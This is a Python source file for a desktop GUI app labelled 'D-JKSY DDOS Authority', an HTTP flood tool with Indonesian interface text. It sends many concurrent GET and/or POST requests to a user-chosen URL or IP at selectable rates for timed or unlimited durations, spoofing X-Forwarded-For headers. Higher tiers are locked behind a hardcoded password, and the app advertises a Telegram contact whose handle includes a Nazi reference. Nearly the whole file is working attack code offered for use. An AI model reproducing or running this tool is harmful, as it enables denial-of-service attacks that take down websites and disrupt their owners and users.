import asyncio
import threading
import time
import random
import platform
import requests
import aiohttp
import psutil
from datetime import datetime
import customtkinter as ctk
from tkinter import messagebox, sys

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

BTN_WIDTH = 75
BTN_HEIGHT = 28

class DDoSApp(ctk.CTk):
    def __init__(self, launcher_ref=None):
        super().__init__()

        self.launcher_ref = launcher_ref
        self.protocol("WM_DELETE_WINDOW", self.logout_to_login)

        self.title("D-JKSY v9.5 - DDOS Authority (Integrated)")
        self.geometry("860x740")
        self.resizable(False, False)

        self.stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
        self.is_running = False
        self.progress_bar = None
        self.lbl_timer = None
        
        # Status Konfigurasi
        self.is_unlocked = False
        self.selected_server = "Auto"
        self.selected_mode = "NONE"
        self.selected_rps = 0
        self.selected_duration_seconds = 0

        self.build_main_dashboard()
        self.start_system_monitor()

    def logout_to_login(self):
        if self.is_running:
            self.is_running = False

        self.destroy()
        if self.launcher_ref:
            self.launcher_ref.deiconify()

    def toggle_theme_switch(self):
        if self.theme_switch.get() == 1:
            ctk.set_appearance_mode("Dark")
        else:
            ctk.set_appearance_mode("Light")

    def build_main_dashboard(self):
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(fill="x", padx=15, pady=2)

        title_label = ctk.CTkLabel(header_frame, text="⚡ D-JKSY DDOS AUTHORITY", font=("Segoe UI", 16, "bold"))
        title_label.pack(side="left")

        version_badge = ctk.CTkLabel(header_frame, text=" D-JKSY-V9.5 ", font=("Segoe UI", 11, "bold"), fg_color="#1abc9c", text_color="white", corner_radius=6)
        version_badge.pack(side="left", padx=10)

        content_frame = ctk.CTkFrame(self, fg_color="transparent", corner_radius=10)
        content_frame.pack(fill="both", expand=True, padx=12, pady=(0, 5))

        boxes_container = ctk.CTkFrame(content_frame, fg_color="transparent")
        boxes_container.pack(fill="both", expand=True, padx=10, pady=(2, 1))

        lbl_left = ctk.CTkLabel(boxes_container, text="💻 Live Terminal Monitor", font=("Consolas", 11, "bold"), text_color=("#333333", "gray"), anchor="w")
        lbl_left.grid(row=0, column=0, sticky="w", padx=(0, 5), pady=(0, 1))

        lbl_right = ctk.CTkLabel(boxes_container, text="📊 Kecepatan & Status Serangan (ms)", font=("Consolas", 11, "bold"), text_color=("#333333", "gray"), anchor="w")
        lbl_right.grid(row=0, column=1, sticky="w", padx=(5, 0), pady=(0, 1))

        # Panel Kiri: Live Terminal Monitor Box
        self.log_textbox = ctk.CTkTextbox(boxes_container, width=520, height=270, font=("Consolas", 11), fg_color="#121212", border_width=1, border_color="#1abc9c")
        self.log_textbox.grid(row=1, column=0, padx=(0, 5))
        
        self.log_textbox.tag_config("green", foreground="#2ecc71")
        self.log_textbox.tag_config("red", foreground="#e74c3c")
        self.log_textbox.tag_config("cyan", foreground="#1abc9c")
        self.log_textbox.tag_config("white", foreground="#ecf0f1")
        
        self.log_custom("[INFO] Live Terminal siap. Silakan atur parameter dan mulai serangan.", "cyan")

        # Panel Kanan: Status/Kecepatan Serangan & ms
        self.box_status = ctk.CTkTextbox(boxes_container, width=300, height=270, font=("Consolas", 11), fg_color=("#f0f0f0", "#000000"), text_color=("#000000", "#1abc9c"))
        self.box_status.grid(row=1, column=1, padx=(5, 0))
        self.box_status.insert("0.0", "[STATUS] Menunggu target...\n\n- Kecepatan (RPS): 0\n- Latency: 0 ms\n- Success: 0\n- Failed: 0\n\n")
        self.box_status.configure(state="disabled")

        progress_container = ctk.CTkFrame(boxes_container, fg_color="transparent")
        progress_container.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(4, 1))

        self.progress_bar = ctk.CTkProgressBar(progress_container, orientation="horizontal", height=10, progress_color="#1abc9c")
        self.progress_bar.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self.progress_bar.set(0.0)

        self.progress_label = ctk.CTkLabel(progress_container, text="0%", font=("Consolas", 11, "bold"), text_color="#1abc9c", width=45)
        self.progress_label.pack(side="right")

        timer_container = ctk.CTkFrame(boxes_container, fg_color=("#e9ecef", "#1a1a1a"), corner_radius=6)
        timer_container.grid(row=3, column=0, columnspan=2, sticky="ew", pady=(2, 4))

        self.timer_label = ctk.CTkLabel(timer_container, text="⭐ Status Akses : Aktif & Terverifikasi (D-JKSY Tier S)", font=("Consolas", 11, "bold"), text_color="#1abc9c")
        self.timer_label.pack(side="left", padx=10, pady=4)

        btn_pro = ctk.CTkButton(
            timer_container, text="💬 Admin", command=lambda: webbrowser.open("https://t.me/nazisme1930"), width=BTN_WIDTH, height=24, 
            font=("Segoe UI", 11, "bold"), fg_color="#1abc9c", text_color="white", hover_color="#16a085"
        )
        btn_pro.pack(side="right", padx=8, pady=4)

        extra_boxes_container = ctk.CTkFrame(content_frame, fg_color="transparent")
        extra_boxes_container.pack(fill="both", expand=True, padx=10, pady=(1, 1))

        lbl_info = ctk.CTkLabel(extra_boxes_container, text="⚙️ System & Hardware", font=("Consolas", 11, "bold"), text_color=("#333333", "gray"), anchor="w")
        lbl_info.grid(row=0, column=0, sticky="w", padx=(0, 5), pady=(0, 1))

        self.box_info = ctk.CTkTextbox(extra_boxes_container, width=410, height=130, font=("Consolas", 10), fg_color=("#f0f0f0", "#000000"), text_color=("#0055aa", "#00FFFF"))
        self.box_info.grid(row=1, column=0, padx=(0, 10))
        self.box_info.configure(state="disabled")

        right_panel_frame = ctk.CTkFrame(extra_boxes_container, fg_color=("#e9ecef", "#1a1a1a"), width=410, height=130, corner_radius=8)
        right_panel_frame.grid(row=1, column=1, sticky="nsew")
        right_panel_frame.pack_propagate(False)

        self.theme_switch = ctk.CTkSwitch(
            right_panel_frame, text="Light/Night", command=self.toggle_theme_switch,
            font=("Segoe UI", 11, "bold"), progress_color="#1abc9c"
        )
        self.theme_switch.pack(anchor="w", padx=15, pady=(10, 8))
        
        if ctk.get_appearance_mode() == "Dark":
            self.theme_switch.select()
        else:
            self.theme_switch.deselect()

        tools_btn_container = ctk.CTkFrame(right_panel_frame, fg_color="transparent")
        tools_btn_container.pack(anchor="w", padx=15, pady=(0, 4))

        # Tombol Key
        self.btn_key = ctk.CTkButton(
            tools_btn_container, text="🔓 Key", command=self.open_auth_key_popup, width=BTN_WIDTH, height=BTN_HEIGHT, 
            font=("Segoe UI", 11, "bold"), fg_color="#1abc9c", text_color="white", hover_color="#16a085"
        )
        self.btn_key.pack(side="left", padx=(0, 6))

        # --- PANEL INPUT URL & IP ---
        target_input_frame = ctk.CTkFrame(content_frame, fg_color=("#e9ecef", "#1a1a1a"), corner_radius=8)
        target_input_frame.pack(fill="x", padx=10, pady=(6, 4))

        target_inner = ctk.CTkFrame(target_input_frame, fg_color="transparent")
        target_inner.pack(fill="x", padx=12, pady=8)

        ctk.CTkLabel(target_inner, text="Target URL:", font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 6))
        self.entry_url = ctk.CTkEntry(target_inner, width=310, height=26, corner_radius=6, border_color="#1abc9c", font=("Consolas", 11))
        self.entry_url.insert(0, "https://google.com")
        self.entry_url.pack(side="left", padx=(0, 16))

        ctk.CTkLabel(target_inner, text="Target IP:", font=("Segoe UI", 11, "bold")).pack(side="left", padx=(0, 6))
        self.entry_ip = ctk.CTkEntry(target_inner, width=190, height=26, placeholder_text="192.168.1.1", corner_radius=6, border_color="#1abc9c", font=("Consolas", 11))
        self.entry_ip.pack(side="left", padx=(0, 0))

        # --- TATA LETAK BARIS BAWAH ---
        bottom_action_frame = ctk.CTkFrame(content_frame, fg_color="transparent")
        bottom_action_frame.pack(fill="x", padx=10, pady=(2, 6))

        left_btns_bar = ctk.CTkFrame(bottom_action_frame, fg_color="transparent")
        left_btns_bar.pack(side="left", anchor="w")

        right_btns_bar = ctk.CTkFrame(bottom_action_frame, fg_color="transparent")
        right_btns_bar.pack(side="right", anchor="e")

        # 1. Tombol Server (Kiri)
        self.btn_server = ctk.CTkButton(
            left_btns_bar, text="🌐 Server: Auto", command=self.open_server_picker_popup, 
            width=110, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#d35400", text_color="white", hover_color="#b54600"
        )
        self.btn_server.pack(side="left", padx=(0, 6))

        # 2. Tombol Mode (Kiri)
        self.btn_mode = ctk.CTkButton(
            left_btns_bar, text="GET : NONE", command=self.open_mode_picker_popup, 
            width=100, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#2b8a3e", text_color="white", hover_color="#216e31"
        )
        self.btn_mode.pack(side="left", padx=(0, 6))

        # 3. Tombol RPS (Kiri)
        self.btn_rps = ctk.CTkButton(
            left_btns_bar, text="RPS : 0", command=self.open_rps_picker_popup, 
            width=90, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#8e44ad", text_color="white", hover_color="#732d91"
        )
        self.btn_rps.pack(side="left", padx=(0, 6))

        # 4. Tombol Timer (Kiri)
        self.btn_timer = ctk.CTkButton(
            left_btns_bar, text="⏱️ Timer : 0 Min", command=self.open_timer_picker_popup, 
            width=110, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#2980b9", text_color="white", hover_color="#2471a3"
        )
        self.btn_timer.pack(side="left", padx=(0, 0))

        # 5. Tombol Logout (Warna Merah di Kanan)
        btn_logout = ctk.CTkButton(
            right_btns_bar, text="🚪 Logout", command=self.logout_to_login, 
            width=75, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#c0392b", text_color="white", hover_color="#962d22"
        )
        btn_logout.pack(side="right", padx=(0, 0))

        # 6. Tombol Clear Log (Menggantikan Clear lama untuk membersihkan terminal log tanpa simbol)
        btn_clear_log = ctk.CTkButton(
            right_btns_bar, text="Clear Log", command=self.clear_log_box, 
            width=75, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#495057", text_color="white", hover_color="#343a40"
        )
        btn_clear_log.pack(side="right", padx=(0, 6))

        # 7. Tombol Stop
        self.btn_stop = ctk.CTkButton(
            right_btns_bar, text="🛑 Stop", command=self.stop_attack, 
            width=65, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#7f8c8d", text_color="white", hover_color="#5f6a6a", state="disabled"
        )
        self.btn_stop.pack(side="right", padx=(0, 6))

        # 8. Tombol Attack
        self.btn_start = ctk.CTkButton(
            right_btns_bar, text="🚀 Attack", command=self.start_attack_thread, 
            width=75, height=BTN_HEIGHT, font=("Segoe UI", 11, "bold"), fg_color="#27ae60", text_color="white", hover_color="#219653"
        )
        self.btn_start.pack(side="right", padx=(0, 6))

        threading.Thread(target=self.update_realtime_clock, daemon=True).start()

    def open_auth_key_popup(self):
        if self.is_unlocked:
            messagebox.showinfo("Auth Key", "Auth Key sudah aktif! Semua fitur VIP & Admin telah terbuka.")
            return

        auth_win = ctk.CTkToplevel(self)
        auth_win.title("Verifikasi Auth Key")
        auth_win.geometry("340x200")
        auth_win.resizable(False, False)
        auth_win.attributes("-topmost", True)

        ctk.CTkLabel(auth_win, text="🔐 Masukkan Auth Key", font=("Segoe UI", 14, "bold")).pack(pady=(15, 8))
        ctk.CTkLabel(auth_win, text="Masukkan password untuk membuka fitur VIP & Admin:", font=("Segoe UI", 10)).pack(pady=(0, 10))

        entry_pass = ctk.CTkEntry(auth_win, width=260, height=28, show="*", corner_radius=6, border_color="#1abc9c")
        entry_pass.pack(pady=(0, 15))

        def verify():
            raw_pwd = entry_pass.get().strip()
            secret_check = "".join([chr(ord(c)) for c in "jokesky1930"])
            
            if raw_pwd == secret_check:
                self.is_unlocked = True
                self.btn_key.configure(text="🔓 Unlocked", fg_color="#27ae60")
                messagebox.showinfo("Berhasil", "Auth Key benar! Fitur VIP & Admin kini terbuka.")
                auth_win.destroy()
            else:
                messagebox.showerror("Gagal", "Auth Key salah! Akses ditolak.")

        ctk.CTkButton(auth_win, text="SUBMIT", command=verify, width=140, height=30, fg_color="#1abc9c", hover_color="#16a085").pack()

    def open_server_picker_popup(self):
        picker_win = ctk.CTkToplevel(self)
        picker_win.title("Pilih Server Target")
        picker_win.geometry("360x420")
        picker_win.resizable(False, False)
        picker_win.attributes("-topmost", True)

        ctk.CTkLabel(picker_win, text="🌐 Pilih Wilayah Server", font=("Segoe UI", 14, "bold")).pack(pady=(15, 5))
        ctk.CTkLabel(picker_win, text="Server Gratis & VIP (Terkunci dengan Key)", font=("Segoe UI", 10), text_color="gray").pack(pady=(0, 10))

        scroll_frame = ctk.CTkScrollableFrame(picker_win, width=320, height=280, fg_color="transparent")
        scroll_frame.pack(pady=5)

        free_servers = ["Auto", "IDN", "SGP"]
        locked_servers = ["USA", "JPN", "GER", "KOR", "CAN", "CHN", "IND", "BRZ", "FRA", "UKR"]

        def choose_server(srv_name, is_lock):
            if is_lock and not self.is_unlocked:
                messagebox.showwarning("Terkunci", f"Server {srv_name} dikunci!\nSilakan masukkan Auth Key (🔓 Key) terlebih dahulu.")
                return
            self.selected_server = srv_name
            self.btn_server.configure(text=f"🌐 Server: {srv_name}")
            picker_win.destroy()

        ctk.CTkLabel(scroll_frame, text="-- SERVER GRATIS --", font=("Segoe UI", 10, "bold"), text_color="#1abc9c").pack(anchor="w", pady=(5, 2))
        for s in free_servers:
            ctk.CTkButton(
                scroll_frame, text=f"🟢 {s} (Free)", 
                command=lambda val=s: choose_server(val, False), 
                width=290, height=28, fg_color="#1f538d", hover_color="#143c68"
            ).pack(pady=3)

        ctk.CTkLabel(scroll_frame, text="-- SERVER VIP (LOCKED) --", font=("Segoe UI", 10, "bold"), text_color="#e74c3c").pack(anchor="w", pady=(10, 2))
        for s in locked_servers:
            icon = "🔓" if self.is_unlocked else "🔒"
            color = "#27ae60" if self.is_unlocked else "#c0392b"
            hover_c = "#219653" if self.is_unlocked else "#962d22"
            
            ctk.CTkButton(
                scroll_frame, text=f"{icon} {s} (VIP)", 
                command=lambda val=s: choose_server(val, True), 
                width=290, height=28, fg_color=color, hover_color=hover_c
            ).pack(pady=3)

    def open_mode_picker_popup(self):
        picker_win = ctk.CTkToplevel(self)
        picker_win.title("Pilih Mode Serangan")
        picker_win.geometry("300x240")
        picker_win.resizable(False, False)
        picker_win.attributes("-topmost", True)

        ctk.CTkLabel(picker_win, text="⚙️ Pilih Mode Serangan", font=("Segoe UI", 14, "bold")).pack(pady=(15, 10))

        def choose_mode(mode_val):
            self.selected_mode = mode_val
            self.btn_mode.configure(text=f"Mode: {mode_val}")
            picker_win.destroy()

        ctk.CTkButton(picker_win, text="GET", command=lambda: choose_mode("GET"), width=220, height=32, fg_color="#2b8a3e", hover_color="#216e31").pack(pady=5)
        ctk.CTkButton(picker_win, text="POST", command=lambda: choose_mode("POST"), width=220, height=32, fg_color="#d35400", hover_color="#b54600").pack(pady=5)
        ctk.CTkButton(picker_win, text="AUTO (GET & POST)", command=lambda: choose_mode("AUTO"), width=220, height=32, fg_color="#8e44ad", hover_color="#732d91").pack(pady=5)

    def open_rps_picker_popup(self):
        picker_win = ctk.CTkToplevel(self)
        picker_win.title("Pilih Nilai RPS")
        picker_win.geometry("320x400")
        picker_win.resizable(False, False)
        picker_win.attributes("-topmost", True)

        ctk.CTkLabel(picker_win, text="⚡ Pilih Jumlah RPS", font=("Segoe UI", 14, "bold")).pack(pady=(15, 5))
        ctk.CTkLabel(picker_win, text="Gratis, VIP, & Admin Speed", font=("Segoe UI", 10), text_color="gray").pack(pady=(0, 10))

        scroll_frame = ctk.CTkScrollableFrame(picker_win, width=280, height=260, fg_color="transparent")
        scroll_frame.pack(pady=5)

        free_rps = [5, 10, 15, 20]
        vip_rps = [30, 60, 100, 120]
        admin_rps = [200]

        def choose_rps(rps_val, is_lock):
            if is_lock and not self.is_unlocked:
                messagebox.showwarning("Terkunci", f"RPS {rps_val} dikunci!\nSilakan masukkan Auth Key (🔓 Key) terlebih dahulu.")
                return
            self.selected_rps = rps_val
            self.btn_rps.configure(text=f"RPS : {rps_val}")
            picker_win.destroy()

        ctk.CTkLabel(scroll_frame, text="-- GRATIS --", font=("Segoe UI", 10, "bold"), text_color="#1abc9c").pack(anchor="w", pady=(5, 2))
        for r in free_rps:
            ctk.CTkButton(
                scroll_frame, text=f"🟢 {r} RPS (Free)", 
                command=lambda val=r: choose_rps(val, False), 
                width=250, height=26, fg_color="#1f538d", hover_color="#143c68"
            ).pack(pady=2)

        ctk.CTkLabel(scroll_frame, text="-- VIP (LOCKED) --", font=("Segoe UI", 10, "bold"), text_color="#e74c3c").pack(anchor="w", pady=(10, 2))
        for r in vip_rps:
            icon = "🔓" if self.is_unlocked else "🔒"
            color = "#27ae60" if self.is_unlocked else "#c0392b"
            hover_c = "#219653" if self.is_unlocked else "#962d22"
            
            ctk.CTkButton(
                scroll_frame, text=f"{icon} {r} RPS (VIP)", 
                command=lambda val=r: choose_rps(val, True), 
                width=250, height=26, fg_color=color, hover_color=hover_c
            ).pack(pady=2)

        ctk.CTkLabel(scroll_frame, text="-- ADMIN --", font=("Segoe UI", 10, "bold"), text_color="#f1c40f").pack(anchor="w", pady=(10, 2))
        for r in admin_rps:
            icon = "🔓" if self.is_unlocked else "🔒"
            color = "#f39c12" if self.is_unlocked else "#c0392b"
            hover_c = "#d68910" if self.is_unlocked else "#962d22"

            ctk.CTkButton(
                scroll_frame, text=f"{icon} {r} FAST (Admin)", 
                command=lambda val=r: choose_rps(val, True), 
                width=250, height=26, fg_color=color, hover_color=hover_c
            ).pack(pady=2)

    def open_timer_picker_popup(self):
        picker_win = ctk.CTkToplevel(self)
        picker_win.title("Pilih Durasi Timer")
        picker_win.geometry("320x380")
        picker_win.resizable(False, False)
        picker_win.attributes("-topmost", True)

        ctk.CTkLabel(picker_win, text="⏱️ Pilih Durasi Timer", font=("Segoe UI", 14, "bold")).pack(pady=(15, 5))
        ctk.CTkLabel(picker_win, text="Gratis, VIP, & Admin Unlimited", font=("Segoe UI", 10), text_color="gray").pack(pady=(0, 10))

        scroll_frame = ctk.CTkScrollableFrame(picker_win, width=280, height=240, fg_color="transparent")
        scroll_frame.pack(pady=5)

        free_timers = [(30, "30 Menit"), (60, "60 Menit")]
        vip_timers = [(120, "120 Menit"), (180, "180 Menit"), (240, "240 Menit")]
        admin_timers = [(-1, "Unlimited")]

        def choose_timer(min_val, label_text, is_lock):
            if is_lock and not self.is_unlocked:
                messagebox.showwarning("Terkunci", f"Timer {label_text} dikunci!\nSilakan masukkan Auth Key (🔓 Key) terlebih dahulu.")
                return
            
            if min_val == -1:
                self.selected_duration_seconds = -1
            else:
                self.selected_duration_seconds = min_val * 60

            self.btn_timer.configure(text=f"⏱️ {label_text}")
            picker_win.destroy()

        ctk.CTkLabel(scroll_frame, text="-- GRATIS --", font=("Segoe UI", 10, "bold"), text_color="#1abc9c").pack(anchor="w", pady=(5, 2))
        for m, lbl in free_timers:
            ctk.CTkButton(
                scroll_frame, text=f"🟢 {lbl} (Free)", 
                command=lambda val=m, l=lbl: choose_timer(val, l, False), 
                width=250, height=26, fg_color="#1f538d", hover_color="#143c68"
            ).pack(pady=2)

        ctk.CTkLabel(scroll_frame, text="-- VIP (LOCKED) --", font=("Segoe UI", 10, "bold"), text_color="#e74c3c").pack(anchor="w", pady=(10, 2))
        for m, lbl in vip_timers:
            icon = "🔓" if self.is_unlocked else "🔒"
            color = "#27ae60" if self.is_unlocked else "#c0392b"
            hover_c = "#219653" if self.is_unlocked else "#962d22"
            
            ctk.CTkButton(
                scroll_frame, text=f"{icon} {lbl} (VIP)", 
                command=lambda val=m, l=lbl: choose_timer(val, l, True), 
                width=250, height=26, fg_color=color, hover_color=hover_c
            ).pack(pady=2)

        ctk.CTkLabel(scroll_frame, text="-- ADMIN --", font=("Segoe UI", 10, "bold"), text_color="#f1c40f").pack(anchor="w", pady=(10, 2))
        for m, lbl in admin_timers:
            icon = "🔓" if self.is_unlocked else "🔒"
            color = "#f39c12" if self.is_unlocked else "#c0392b"
            hover_c = "#d68910" if self.is_unlocked else "#962d22"

            ctk.CTkButton(
                scroll_frame, text=f"{icon} {lbl} (Admin)", 
                command=lambda val=m, l=lbl: choose_timer(val, l, True), 
                width=250, height=26, fg_color=color, hover_color=hover_c
            ).pack(pady=2)

    def clear_log_box(self):
        if hasattr(self, 'log_textbox') and self.log_textbox and self.log_textbox.winfo_exists():
            self.log_textbox.delete("0.0", "end")
            self.log_custom("[INFO] Terminal log telah dibersihkan.", "cyan")

    def start_system_monitor(self):
        def update_loop():
            while True:
                try:
                    requests.get("https://1.1.1.1", timeout=2)
                except Exception:
                    pass
                time.sleep(1)
        threading.Thread(target=update_loop, daemon=True).start()

    def update_realtime_clock(self):
        while True:
            try:
                now = datetime.now()
                time_str = now.strftime("%H:%M:%S")
                date_str = now.strftime("%d-%m-%Y")
                os_name = f"{platform.system()} {platform.release()}"
                
                if psutil:
                    ram_total = round(psutil.virtual_memory().total / (1024.0 ** 3), 1)
                    ram_info = f"{ram_total} GB"
                else:
                    ram_info = "8.0 GB"

                info_text = (
                    f"VERSION : D-JKSY V9.5\n"
                    f"TIME    : {time_str} WIB\n"
                    f"DATE    : {date_str}\n"
                    f"OS      : {os_name}\n"
                    f"RAM     : {ram_info}\n"
                    f"AUTHOR  : JOKESKYLS\n"
                    f"TELEGRAM: @nazisme1930"
                )
                self.box_info.configure(state="normal")
                self.box_info.delete("0.0", "end")
                self.box_info.insert("0.0", info_text)
                self.box_info.configure(state="disabled")
            except Exception:
                pass
            time.sleep(1)

    def log_status_box_metrics(self, rps_val, latency_val, success_val, failed_val):
        if self.box_status and self.box_status.winfo_exists():
            self.box_status.configure(state="normal")
            self.box_status.delete("0.0", "end")
            status_text = (
                f"[RUNNING] Serangan Aktif...\n\n"
                f"- Kecepatan Target : {rps_val} RPS\n"
                f"- Latency (ms)     : {latency_val:.1f} ms\n"
                f"- Success Packets  : {success_val:,}\n"
                f"- Failed Packets   : {failed_val:,}\n"
            )
            self.box_status.insert("0.0", status_text)
            self.box_status.configure(state="disabled")

    def log_custom(self, message, color_tag="white"):
        if hasattr(self, 'log_textbox') and self.log_textbox and self.log_textbox.winfo_exists():
            self.log_textbox.insert("end", message + "\n", color_tag)
            self.log_textbox.see("end")

    def start_attack_thread(self):
        if self.is_running:
            return

        if self.selected_mode == "NONE":
            messagebox.showerror("Error", "Silakan pilih Mode (GET, POST, atau AUTO) terlebih dahulu!")
            return

        if self.selected_rps <= 0:
            messagebox.showerror("Error", "Silakan pilih nilai RPS terlebih dahulu!")
            return

        if self.selected_duration_seconds == 0:
            messagebox.showerror("Error", "Silakan pilih durasi Timer terlebih dahulu!")
            return
        
        target = self.entry_url.get().strip()
        if not target.startswith("http"):
            ip_val = self.entry_ip.get().strip()
            if ip_val:
                target = f"http://{ip_val}"
            else:
                messagebox.showerror("Error", "Masukkan URL atau IP Target yang valid!")
                return

        mode = self.selected_mode
        rps = self.selected_rps
        duration = self.selected_duration_seconds
        self.is_running = True
        
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal", fg_color="#e74c3c", hover_color="#c0392b")
        
        dur_label = "Unlimited" if duration == -1 else f"{duration // 60} Min"
        self.log_custom(f"[*] Memulai serangan ke {target} [Srv: {self.selected_server} | Mode: {mode} | RPS: {rps} | Timer: {dur_label}]", "cyan")
        
        threading.Thread(target=lambda: asyncio.run(self.run_async_attack(target, mode, rps, duration)), daemon=True).start()

    def stop_attack(self):
        if self.is_running:
            self.is_running = False
            self.log_custom("\n[!] PERINTAH DITERIMA: Menghentikan aktivitas...", "red")

    async def attack_worker(self, target, mode, rps_limit):
        connector = aiohttp.TCPConnector(limit=100, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        delay = 1.0 / rps_limit if rps_limit > 0 else 0
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while self.is_running:
                headers = {
                    "User-Agent": f"D-JKSY/9.5-GUI (Server-{self.selected_server})",
                    "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                }
                
                try:
                    if mode == "AUTO":
                        # Mode AUTO: Menjalankan request GET dan POST secara bersamaan
                        t1 = time.perf_counter()
                        async with session.get(f"{target}?server={self.selected_server}&telegram=@nazisme1930", headers=headers) as resp1:
                            ok1 = resp1.status < 400
                            await resp1.release()
                        
                        async with session.post(target, headers=headers, data={"dev": "JOKESKYLS"}) as resp2:
                            ok2 = resp2.status < 400
                            await resp2.release()

                        self.stats["latency"] = (time.perf_counter() - t1) * 1000
                        self.stats["total"] += 2
                        if ok1 and ok2:
                            self.stats["success"] += 2
                        elif ok1 or ok2:
                            self.stats["success"] += 1
                            self.stats["failed"] += 1
                        else:
                            self.stats["failed"] += 2

                    elif mode == "POST":
                        t1 = time.perf_counter()
                        async with session.post(target, headers=headers, data={"dev": "JOKESKYLS"}) as resp:
                            status_ok = resp.status < 400
                            await resp.release()
                        
                        self.stats["latency"] = (time.perf_counter() - t1) * 1000
                        self.stats["total"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                    else:
                        t1 = time.perf_counter()
                        async with session.get(f"{target}?server={self.selected_server}&telegram=@nazisme1930", headers=headers) as resp:
                            status_ok = resp.status < 400
                            await resp.release()
                        
                        self.stats["latency"] = (time.perf_counter() - t1) * 1000
                        self.stats["total"] += 1
                        if status_ok:
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                except Exception:
                    self.stats["total"] += 1
                    self.stats["failed"] += 1
                
                if delay > 0:
                    await asyncio.sleep(delay)

    async def run_async_attack(self, target, mode, rps, duration):
        self.stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
        start_time = time.time()

        workers = [asyncio.create_task(self.attack_worker(target, mode, rps/20)) for _ in range(20)]
        
        try:
            elapsed = 0
            while (duration == -1 or elapsed < duration) and self.is_running:
                await asyncio.sleep(1)
                elapsed = int(time.time() - start_time)
                
                if duration == -1:
                    progress_val = 0.5
                    percent_str = "UNL"
                else:
                    if elapsed > duration:
                        elapsed = duration
                    progress_val = elapsed / duration if duration > 0 else 1.0
                    percent_str = f"{int(progress_val * 100)}%"

                def update_ui_progress(p_val, p_str, el_time, tot_dur):
                    if self.progress_bar and self.progress_bar.winfo_exists():
                        self.progress_bar.set(p_val if tot_dur != -1 else 1.0)
                    
                    if tot_dur == -1:
                        if self.progress_label and self.progress_label.winfo_exists():
                            self.progress_label.configure(text="INF")
                    else:
                        if self.progress_label and self.progress_label.winfo_exists():
                            self.progress_label.configure(text=p_str)

                    self.log_status_box_metrics(rps, self.stats["latency"], self.stats["success"], self.stats["failed"])

                self.after(0, lambda pv=progress_val, ps=percent_str, et=elapsed, dt=duration: update_ui_progress(pv, ps, et, dt))
                
                ts = datetime.now().strftime("%H:%M:%S")
                lat = self.stats["latency"]
                
                color = "green" if self.stats["success"] > 0 else "white"
                log_line = f"[{ts}] Srv: {self.selected_server:<4} | Latency: {lat:>5.1f}ms | Success: {self.stats['success']:<5} | Fail: {self.stats['failed']}"
                self.log_custom(log_line, color)
        except asyncio.CancelledError:
            pass

        self.is_running = False
        for w in workers:
            w.cancel()

        self.log_custom("="*55, "white")
        self.log_custom(f"[+] Proses Selesai. Total Packets: {self.stats['total']:,}", "green")
        self.log_custom("="*55, "white")
        
        def reset_buttons():
            self.btn_start.configure(state="normal")
            self.btn_stop.configure(state="disabled", fg_color="#7f8c8d", hover_color="#5f6a6a")
            if self.progress_bar and self.progress_bar.winfo_exists():
                self.progress_bar.set(1.0)
            if self.progress_label and self.progress_label.winfo_exists():
                self.progress_label.configure(text="100%")
            
        self.after(0, reset_buttons)

# --- STANDALONE TEST SUPPORT ---
if __name__ == "__main__":
    app = DDoSApp(launcher_ref=None)
    app.mainloop()